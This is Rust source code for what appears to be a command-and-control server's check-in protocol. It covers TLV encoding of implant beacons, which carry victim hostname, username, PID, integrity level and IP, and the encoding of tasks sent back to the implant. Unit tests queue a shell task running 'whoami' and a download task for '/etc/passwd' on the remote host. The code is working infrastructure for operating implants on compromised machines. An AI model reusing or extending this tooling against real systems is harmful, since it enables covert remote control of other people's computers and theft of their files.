use serde::{Deserialize, Serialize};

// ── TLV binary wire format ──────────────────────────────────────────────────

/// TLV tag constants for the binary checkin wire format.
pub mod tlv_tags {
    // Request tags (implant -> server)
    pub const SEQ_NUMBER: u16 = 0x0001;
    pub const IMPLANT_PUBKEY: u16 = 0x0002;
    pub const CHECKIN_COUNT: u16 = 0x0003;
    pub const HOSTNAME: u16 = 0x0010;
    pub const USERNAME: u16 = 0x0011;
    pub const PID: u16 = 0x0012;
    pub const OS_VERSION: u16 = 0x0013;
    pub const PROCESS_NAME: u16 = 0x0008;
    pub const INTEGRITY_LEVEL: u16 = 0x0009;
    pub const INTERNAL_IP: u16 = 0x000B;
    pub const TASK_RESULT: u16 = 0x0020;
    pub const RESULT_TASK_ID: u16 = 0x0021;
    pub const RESULT_STATUS: u16 = 0x0022;
    pub const RESULT_DATA: u16 = 0x0023;

    // Response tags (server -> implant)
    pub const SESSION_ID: u16 = 0x0100;
    pub const TASK_BLOCK: u16 = 0x0200;
    pub const TASK_ID: u16 = 0x0201;
    pub const TASK_TYPE: u16 = 0x0202;
    pub const TASK_ARGS: u16 = 0x0203;
}

/// TLV wire format version byte.
pub const TLV_VERSION: u8 = 0x01;

// ── TLV helpers ─────────────────────────────────────────────────────────────

fn tlv_write_bytes(buf: &mut Vec<u8>, tag: u16, data: &[u8]) {
    buf.extend_from_slice(&tag.to_le_bytes());
    buf.extend_from_slice(&(data.len() as u16).to_le_bytes());
    buf.extend_from_slice(data);
}

fn tlv_write_string(buf: &mut Vec<u8>, tag: u16, s: &str) {
    tlv_write_bytes(buf, tag, s.as_bytes());
}

#[allow(dead_code)] // used in tests; kept public-ready for external TLV payload construction
fn tlv_write_u32(buf: &mut Vec<u8>, tag: u16, val: u32) {
    tlv_write_bytes(buf, tag, &val.to_le_bytes());
}

fn tlv_read_string(data: &[u8]) -> String {
    String::from_utf8_lossy(data).to_string()
}

fn tlv_read_u32(data: &[u8]) -> u32 {
    if data.len() >= 4 {
        u32::from_le_bytes([data[0], data[1], data[2], data[3]])
    } else {
        0
    }
}

/// Iterate TLV fields from a byte slice. Calls `f(tag, value)` for each field.
/// Returns `None` if the data is malformed.
fn tlv_iter<F>(data: &[u8], mut f: F) -> Option<()>
where
    F: FnMut(u16, &[u8]),
{
    let mut pos = 0;
    while pos + 4 <= data.len() {
        let tag = u16::from_le_bytes([data[pos], data[pos + 1]]);
        let len = u16::from_le_bytes([data[pos + 2], data[pos + 3]]) as usize;
        pos += 4;
        if pos + len > data.len() {
            return None;
        }
        f(tag, &data[pos..pos + len]);
        pos += len;
    }
    Some(())
}

// ── TLV parser ──────────────────────────────────────────────────────────────

/// Parse a TLV-encoded binary checkin payload into a `CheckinRequest`.
/// Returns `None` if the data is not valid TLV (might be JSON instead).
pub fn parse_binary_checkin(data: &[u8]) -> Option<CheckinRequest> {
    if data.is_empty() || data[0] != TLV_VERSION {
        return None;
    }

    let mut req = CheckinRequest {
        session_id: None,
        hostname: String::new(),
        username: String::new(),
        pid: 0,
        os_version: String::new(),
        integrity_level: String::new(),
        process_name: String::new(),
        internal_ip: String::new(),
        external_ip: String::new(),
        task_results: Vec::new(),
    };

    let body = &data[1..]; // skip version byte

    tlv_iter(body, |tag, value| {
        match tag {
            tlv_tags::HOSTNAME => req.hostname = tlv_read_string(value),
            tlv_tags::USERNAME => req.username = tlv_read_string(value),
            tlv_tags::PID => req.pid = tlv_read_u32(value),
            tlv_tags::OS_VERSION => req.os_version = tlv_read_string(value),
            tlv_tags::INTEGRITY_LEVEL => req.integrity_level = tlv_read_string(value),
            tlv_tags::PROCESS_NAME => req.process_name = tlv_read_string(value),
            tlv_tags::INTERNAL_IP => req.internal_ip = tlv_read_string(value),
            tlv_tags::TASK_RESULT => {
                // Nested TLV block for one task result
                let mut tr = TaskResultPayload {
                    task_id: String::new(),
                    status: String::new(),
                    result: String::new(),
                };
                tlv_iter(value, |inner_tag, inner_value| {
                    match inner_tag {
                        tlv_tags::RESULT_TASK_ID => tr.task_id = tlv_read_string(inner_value),
                        tlv_tags::RESULT_STATUS => tr.status = tlv_read_string(inner_value),
                        tlv_tags::RESULT_DATA => tr.result = tlv_read_string(inner_value),
                        _ => {} // ignore unknown inner tags
                    }
                });
                req.task_results.push(tr);
            }
            // SEQ_NUMBER, IMPLANT_PUBKEY, CHECKIN_COUNT are parsed but not stored
            // in CheckinRequest (they are handled at the wire/crypto layer).
            _ => {}
        }
    })?;

    Some(req)
}

// ── TLV serializer ──────────────────────────────────────────────────────────

/// Serialize a `CheckinResponse` into TLV binary format.
pub fn serialize_binary_response(resp: &CheckinResponse) -> Vec<u8> {
    let mut buf = Vec::with_capacity(256);
    buf.push(TLV_VERSION);

    // SESSION_ID
    tlv_write_string(&mut buf, tlv_tags::SESSION_ID, &resp.session_id);

    // Tasks
    for task in &resp.tasks {
        let mut task_buf = Vec::new();
        tlv_write_string(&mut task_buf, tlv_tags::TASK_ID, &task.task_id);
        tlv_write_string(&mut task_buf, tlv_tags::TASK_TYPE, &task.task_type);
        tlv_write_bytes(&mut task_buf, tlv_tags::TASK_ARGS, &task.arguments);
        tlv_write_bytes(&mut buf, tlv_tags::TASK_BLOCK, &task_buf);
    }

    buf
}

// ── Structs ─────────────────────────────────────────────────────────────────

/// JSON body sent by the implant on each check-in.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckinRequest {
    /// Set after the first check-in so the server can correlate.
    #[serde(default)]
    pub session_id: Option<String>,
    pub hostname: String,
    pub username: String,
    pub pid: u32,
    #[serde(default)]
    pub os_version: String,
    #[serde(default)]
    pub integrity_level: String,
    #[serde(default)]
    pub process_name: String,
    #[serde(default)]
    pub internal_ip: String,
    #[serde(default)]
    pub external_ip: String,
    #[serde(default)]
    pub task_results: Vec<TaskResultPayload>,
}

/// A completed (or failed) task result sent back in a check-in.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResultPayload {
    pub task_id: String,
    /// "COMPLETE" or "FAILED"
    pub status: String,
    /// Opaque result data (UTF-8 string for now).
    #[serde(default)]
    pub result: String,
}

/// JSON response returned to the implant after a check-in.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckinResponse {
    pub session_id: String,
    pub tasks: Vec<PendingTaskPayload>,
}

/// A task that the implant should execute.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PendingTaskPayload {
    pub task_id: String,
    pub task_type: String,
    /// Raw task arguments (binary-safe). Serialized as UTF-8 string in JSON
    /// when possible, base64-encoded otherwise.
    #[serde(default, serialize_with = "serialize_args", deserialize_with = "deserialize_args")]
    pub arguments: Vec<u8>,
}

fn serialize_args<S: serde::Serializer>(args: &Vec<u8>, s: S) -> Result<S::Ok, S::Error> {
    match std::str::from_utf8(args) {
        Ok(text) => s.serialize_str(text),
        Err(_) => {
            use base64::Engine;
            let encoded = base64::engine::general_purpose::STANDARD.encode(args);
            s.serialize_str(&encoded)
        }
    }
}

fn deserialize_args<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Vec<u8>, D::Error> {
    let s = String::deserialize(d)?;
    Ok(s.into_bytes())
}

// ── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tlv_tests {
    use super::*;

    #[test]
    fn test_binary_checkin_roundtrip() {
        // Build a TLV binary payload manually
        let mut payload = vec![TLV_VERSION];
        tlv_write_u32(&mut payload, tlv_tags::SEQ_NUMBER, 42);
        tlv_write_string(&mut payload, tlv_tags::HOSTNAME, "WORKSTATION01");
        tlv_write_string(&mut payload, tlv_tags::USERNAME, "admin");
        tlv_write_u32(&mut payload, tlv_tags::PID, 1234);
        tlv_write_string(&mut payload, tlv_tags::OS_VERSION, "10.0.22621");

        let req = parse_binary_checkin(&payload).expect("should parse");
        assert_eq!(req.hostname, "WORKSTATION01");
        assert_eq!(req.username, "admin");
        assert_eq!(req.pid, 1234);
        assert_eq!(req.os_version, "10.0.22621");
    }

    #[test]
    fn test_binary_checkin_with_task_results() {
        let mut payload = vec![TLV_VERSION];
        tlv_write_string(&mut payload, tlv_tags::HOSTNAME, "HOST1");
        tlv_write_string(&mut payload, tlv_tags::USERNAME, "user");
        tlv_write_u32(&mut payload, tlv_tags::PID, 100);

        // First task result
        let mut tr1 = Vec::new();
        tlv_write_string(&mut tr1, tlv_tags::RESULT_TASK_ID, "task-001");
        tlv_write_string(&mut tr1, tlv_tags::RESULT_STATUS, "COMPLETE");
        tlv_write_string(&mut tr1, tlv_tags::RESULT_DATA, "output data");
        tlv_write_bytes(&mut payload, tlv_tags::TASK_RESULT, &tr1);

        // Second task result
        let mut tr2 = Vec::new();
        tlv_write_string(&mut tr2, tlv_tags::RESULT_TASK_ID, "task-002");
        tlv_write_string(&mut tr2, tlv_tags::RESULT_STATUS, "FAILED");
        tlv_write_string(&mut tr2, tlv_tags::RESULT_DATA, "error msg");
        tlv_write_bytes(&mut payload, tlv_tags::TASK_RESULT, &tr2);

        let req = parse_binary_checkin(&payload).expect("should parse");
        assert_eq!(req.task_results.len(), 2);
        assert_eq!(req.task_results[0].task_id, "task-001");
        assert_eq!(req.task_results[0].status, "COMPLETE");
        assert_eq!(req.task_results[0].result, "output data");
        assert_eq!(req.task_results[1].task_id, "task-002");
        assert_eq!(req.task_results[1].status, "FAILED");
        assert_eq!(req.task_results[1].result, "error msg");
    }

    #[test]
    fn test_binary_response_serialize() {
        let resp = CheckinResponse {
            session_id: "test-session-id".to_string(),
            tasks: vec![PendingTaskPayload {
                task_id: "task-001".to_string(),
                task_type: "shell".to_string(),
                arguments: b"whoami".to_vec(),
            }],
        };
        let data = serialize_binary_response(&resp);
        assert_eq!(data[0], TLV_VERSION);
        assert!(data.len() > 10);

        // Verify we can read the SESSION_ID TLV back
        let body = &data[1..];
        let mut found_session_id = String::new();
        let mut found_task_count = 0;
        tlv_iter(body, |tag, value| {
            match tag {
                tlv_tags::SESSION_ID => found_session_id = tlv_read_string(value),
                tlv_tags::TASK_BLOCK => {
                    found_task_count += 1;
                    let mut task_id = String::new();
                    let mut task_type = String::new();
                    let mut task_args = String::new();
                    tlv_iter(value, |inner_tag, inner_value| {
                        match inner_tag {
                            tlv_tags::TASK_ID => task_id = tlv_read_string(inner_value),
                            tlv_tags::TASK_TYPE => task_type = tlv_read_string(inner_value),
                            tlv_tags::TASK_ARGS => task_args = tlv_read_string(inner_value),
                            _ => {}
                        }
                    });
                    assert_eq!(task_id, "task-001");
                    assert_eq!(task_type, "shell");
                    assert_eq!(task_args, "whoami");
                }
                _ => {}
            }
        });
        assert_eq!(found_session_id, "test-session-id");
        assert_eq!(found_task_count, 1);
    }

    #[test]
    fn test_binary_response_multiple_tasks() {
        let resp = CheckinResponse {
            session_id: "sid".to_string(),
            tasks: vec![
                PendingTaskPayload {
                    task_id: "t1".to_string(),
                    task_type: "shell".to_string(),
                    arguments: b"whoami".to_vec(),
                },
                PendingTaskPayload {
                    task_id: "t2".to_string(),
                    task_type: "download".to_string(),
                    arguments: b"/etc/passwd".to_vec(),
                },
            ],
        };
        let data = serialize_binary_response(&resp);
        let body = &data[1..];
        let mut task_count = 0;
        tlv_iter(body, |tag, _value| {
            if tag == tlv_tags::TASK_BLOCK {
                task_count += 1;
            }
        });
        assert_eq!(task_count, 2);
    }

    #[test]
    fn test_parse_binary_checkin_rejects_json() {
        let json = b"{\"hostname\":\"test\"}";
        assert!(parse_binary_checkin(json).is_none());
    }

    #[test]
    fn test_parse_binary_checkin_rejects_empty() {
        assert!(parse_binary_checkin(b"").is_none());
    }

    #[test]
    fn test_parse_binary_checkin_rejects_wrong_version() {
        let mut payload = vec![0x02]; // wrong version
        tlv_write_string(&mut payload, tlv_tags::HOSTNAME, "test");
        assert!(parse_binary_checkin(&payload).is_none());
    }
}
